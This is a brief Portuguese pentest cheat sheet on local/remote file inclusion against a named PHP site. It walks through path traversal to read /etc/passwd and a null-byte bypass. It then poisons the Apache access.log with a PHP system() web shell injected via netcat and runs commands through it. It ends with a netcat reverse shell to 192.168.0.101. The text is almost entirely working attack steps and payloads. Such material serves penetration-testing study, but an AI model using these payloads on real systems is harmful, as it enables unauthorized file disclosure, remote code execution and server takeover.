# LFI/RFI Local/Remote File Include

Procure no site algum link que chame alguma página com o parâmetro GET:
rh.businesscorp.com.br/index.php?page=login

Troque o parâmetro do GET por arquivos sensíveis do servidor:
rh.businesscorp.com.br/index.php?page=/../../etc/passwd
*Caso a aplicação utilize a adição de extenção logo depois do arquivo, será necessário testar com **nullbyte**.*

rh.businesscorp.com.br/index.php?page=/../../etc/passwd%00
nullbyte = %00

Podemos carregar o access.log do servidor, normalmente em:
/var/log/apache2/access.log%00
rh.businesscorp.com.br/index.php?page=/../../var/log/apache2/access.log%00

Com isso iremos infectar o access.log com um código malicioso:
nc -v rh.businesscorp.com.br 80 < "<?php system($_GET['cmd']); ?>"

Agora basta informar um parâmetro para o cmd:
rh.businesscorp.com.br/index.php?cmd=ls -la&page=/../../var/log/apache2/access.log%00
rh.businesscorp.com.br/index.php?cmd=uname -a&page=/../../var/log/apache2/access.log%00
rh.businesscorp.com.br/index.php?cmd=nc 192.168.0.101 443 -e /bin/bash&page=/../../var/log/apache2/access.log%00
